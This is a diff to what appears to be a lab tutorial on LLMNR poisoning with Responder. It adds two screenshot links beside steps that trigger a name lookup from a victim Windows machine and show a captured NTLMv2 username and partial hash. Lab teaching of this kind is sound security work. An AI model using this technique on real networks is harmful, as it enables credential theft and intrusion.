@@ -111,6 +111,8 @@ On Windows victim, open File Explorer and type:
 ```
 \\fakeshare
 ```
+![Responder Output](images/step-3.png)
+
 Windows tries DNS → fails → broadcasts LLMNR → Responder catches it.
 
 
@@ -121,6 +123,8 @@ Windows tries DNS → fails → broadcasts LLMNR → Responder catches it.
 [SMB] NTLMv2-SSP Username : VICTIM-2\karim
 [SMB] NTLMv2-SSP Hash     : karim::VICTIM-2:9265e4bef71c4923:19C4EB1DD7F5B53D853808B81F0EBCE4:010100000000000000CFC35AC5E6DC0135AE1EB1E9966109000000000200080036005A .... (full hash)...
 ```
+![Responder Output](images/step_3.png)
+
 ### Step 4 — Capture the Hash
 
 ```bash
